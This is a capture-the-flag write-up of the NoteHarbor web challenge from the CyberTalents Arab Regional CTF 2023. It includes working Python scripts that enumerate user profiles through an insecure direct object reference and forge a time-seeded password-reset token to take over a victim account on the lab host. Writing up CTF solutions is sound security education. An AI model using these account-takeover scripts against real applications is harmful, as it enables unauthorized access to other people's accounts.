---
title: NoteHarbor Web Challenge Writeup Cyber Talents 2023
date: 2023-10-22 1:30:00 +0200
categories:
  - ctf
  - cybert_talents
tags:
  - ctf
  - cyber_talents
  - web_applications
---

I'm thrilled to share that our outstanding team, `creeprs_249`, has reached an impressive milestone! 🎉 We secured the 50th position among around 450 teams hailing from Arabian countries in the prestigious CyberTalents Arab Regional CTF 2023. This competition brought together top talent from across the Arabian region, and our team's dedication and skills allowed us to stand out and achieve this significant recognition. It's a testament to our hard work, teamwork, and commitment to the field of cybersecurity. We're proud of what we've accomplished and excited about what lies ahead in this ever-evolving and exciting field.

I had the privilege of leading the web challenges, and I'm eagerly anticipating the opportunity to share my insights with all of you. I'm sharing a comprehensive write-up detailing how our team successfully tackled the NoteHarbor medium challenge.

##  Description

Mariel Calderwood: Hi I can't login to my account can you help me?

## Source code:
https://example.com/web/NoteHarbor.zip

## Going Through 

I started going through the web application. It is a simple note-taking app with many functionalities, and the most interesting ones are: 
`/register`
`/login` 
`/profile/{id}`
`/forgot_password/{token}`
`/add_note/{id}`
`/update_note/{id}` 
`/delete_note/{id}`

Then I reviewed the source code. It uses Python's Flask library and SQLite to handle the database. So, I took into consideration the following vulnerabilities as a starting point:

- SQL injection
- Server-side template injection (SSTI)
- Insecure direct object reference
- Some broken access control or authentication issues

I started sending some SQL queries and characters but couldn't find any indication of SQL injection. So, I just created a normal account.

```http
POST /register HTTP/1.1
Host: wcomol2z7qrsm350m73p9p6tqzqwndvjympxievy-web.cybertalentslabs.com
Content-Length: 64
Origin: http://wcomol2z7qrsm350m73p9p6tqzqwndvjympxievy-web.cybertalentslabs.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://wcomol2z7qrsm350m73p9p6tqzqwndvjympxievy-web.cybertalentslabs.com/register
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

email=skullhat%40google.com&username=skullhat&password=askullhat
```
Then I logged into my account, created, edited, and then deleted a note. I went to my profile and saw that my ID is 801.

![Image](/assets/img/uploads/20231022060447.png)

So I tried decreasing it, and it worked! I was able to see the profiles of other users, which included the secret key used in creating the password reset token, as we can see in the source code.

![Image](/assets/img/uploads/20231022060600.png)

Now, we need to get the email of the account in the description of the challenge, "Mariel Calderwood." So, I wrote this simple script to grep it. It iterates through a range of IDs and then checks if the text of the response (`r.text`) contains the string "Mariel Calderwood."

```python
import requests 
import urllib3

urllib3.disable_warnings()

url = "http://wcomol2z7qrsm350m73p9p6tqzqwndvjympxievy-web.cybertalentslabs.com/profile/"
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
for i in range(0,801):
    r = requests.get(url+str(i),proxies=proxies, cookies={'session':'eyJ1c2VyX2lkIjo4MDF9.ZTN64g.QaqBBC1W-waCzntgZgEwcS4IlHc'})
    if "Mariel Calderwood" in r.text:
        print("Found!")
        print(url+str(i))

```

![Image](/assets/img/uploads/20231021093655.png)

![Image](/assets/img/uploads/20231022062322.png)

The profile of ID 262 contains the following information:

**Email**: [mcalderwood79@storify.com](mailto:mcalderwood79@storify.com) 
**Username**: Mariel Calderwood 
**Secret**: CH5CSTBK6QH6N8J77VNR8KN44RAHXNP2

I returned to the source code to understand how the token is created:

```python
#snip
def generate_reset_token(user, token_length=32):
    letters_and_digits = string.ascii_uppercase + string.digits

    current_time_minutes = int(datetime.now().timestamp() // 60)
    seed = user.secret + str(current_time_minutes)

    random.seed(seed)
    reset_token = ''.join(random.choice(letters_and_digits) for _ in range(token_length))

    return reset_token
#snip
@app.route('/reset_password/<reset_token>', methods=['GET', 'POST'])
def reset_password(reset_token):
    user = User.query.filter_by(reset_token=reset_token).first()
    if user and user.token_expiration > datetime.now():
        if request.method == 'POST':
            new_password = request.form['new_password']
            hashed_password = bcrypt.generate_password_hash(new_password).decode('utf-8')
            user.password = hashed_password
            user.reset_token = None
            user.token_expiration = None
            db.session.commit()
            flash('Password reset successfully. You can now log in with your new password.', 'success')
            return redirect(url_for('login'))
        return render_template('reset_password.html')
    flash('Invalid or expired reset token.', 'danger')
    return redirect(url_for('forgot_password'))
#snip
```

The function `generate_reset_token()` generates a password reset token for a user by combining their secret key with the current time (in minutes) to seed a random number generator, which is then used to create a token of the specified length using uppercase letters and digits.

  
This route handles the reset password process, where it verifies the reset token, checks if it's valid and not expired, and if the request method is POST, it updates the user's password and clears the reset token; otherwise, it renders the reset password page, and if the token is invalid or expired, it provides an error message and redirects to the forgot password page.

This code appears to generate a 32-character token by concatenating the user's secret key with the current time. It's worth noting that `int(datetime.now().timestamp() // 60)` reduces the randomness of the token, making it typically the same if created in the same minute. Additionally, the use of `random.seed()` and `random.choice()` further reduces the likelihood of guessing the token using a script. To learn more about these functions, you can check [this Stack Overflow thread](https://stackoverflow.com/questions/2257441/random-string-generation-with-upper-case-letters-and-digits).

Given that the token expires in 10 minutes and with knowledge of the secret key and the user's email, I've written this script based on the original code:

```python
import requests
import random
import string
from datetime import datetime
import schedule 
# user.token_expiration = datetime.now() + timedelta(minutes=10)
secret = 'CH5CSTBK6QH6N8J77VNR8KN44RAHXNP2'
url = 'http://wcomol2z7qrsm350m73p9p6tqzqwndvjympxievy-web.cybertalentslabs.com/reset_password/'
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
token_length=32
letters_and_digits = string.ascii_uppercase + string.digits

def send_request():
    print("Start send_thousand_requests")
    current_time_minutes = int(datetime.now().timestamp() // 60)
    seed = secret + str(current_time_minutes)
    random.seed(seed)
    reset_token = ''.join(random.choice(letters_and_digits) for _ in range(token_length))
    r = requests.get(url+reset_token,proxies=proxies, allow_redirects=False)
    if "Invalid or expired reset token." in r.text:
        return
    else:
        print("Found the token: " +url+reset_token)
        x = requests.post(url+reset_token, data={'new_password':'Asd@1234'},proxies=proxies)
        if "Password reset successfully. You can now log in with your new password" in x.text:
            print("Now you can login using:\n" + "Email: mcalderwood79@storify.com\nPassword: Asd@1234" )

def regenrate_token():
    url ="http://wcomol2z7qrsm350m73p9p6tqzqwndvjympxievy-web.cybertalentslabs.com/forgot_password"
    r = requests.post(url, data={'email':'mcalderwood79@storify.com'},proxies=proxies)
    print('Passwor reset token was reset!')
    
regenrate_token()
send_request()
```

It includes a function, `send_request()`, responsible for generating a password reset token, making a request to a specified URL with the token, and verifying a successful password reset while handling token expiration and login information provision upon success. Another function, `regenerate_token()`, is defined as initiating a request for a password token reset. The script concludes by executing `regenerate_token()` to reset the password token and invoking `send_request()` to search for a valid token and perform a password reset.

![Image](/assets/img/uploads/20231022062127.png)

I used the credentials and woop woop! I successfully obtained the flag!

![Image](/assets/img/uploads/20231022061847.png)

  
When discovering the flag, this joke emerges: "Why did the PRNG developer consistently maintain a poker face? Because they mastered the art of concealing their 'random' expressions!" 🤣
